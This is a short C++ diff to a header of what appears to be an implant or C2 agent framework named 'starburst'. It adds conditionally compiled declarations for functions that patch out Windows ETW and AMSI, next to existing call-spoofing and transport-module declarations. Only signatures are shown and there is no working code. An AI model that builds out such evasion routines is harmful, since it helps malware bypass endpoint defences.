@@ -61,6 +61,13 @@ namespace starburst {
     auto declfn spoof_call( instance& inst, FUNCTION_CALL* call ) -> ULONG_PTR;
 #endif
 
+#ifdef INCLUDE_EVASION_ETW
+    auto declfn evasion_patch_etw( instance& inst ) -> void;
+#endif
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+    auto declfn evasion_patch_amsi( instance& inst ) -> void;
+#endif
+
     /* ─── transport module (interface only - one active per build) ─── */
 
     auto declfn transport_init( instance& inst ) -> bool;
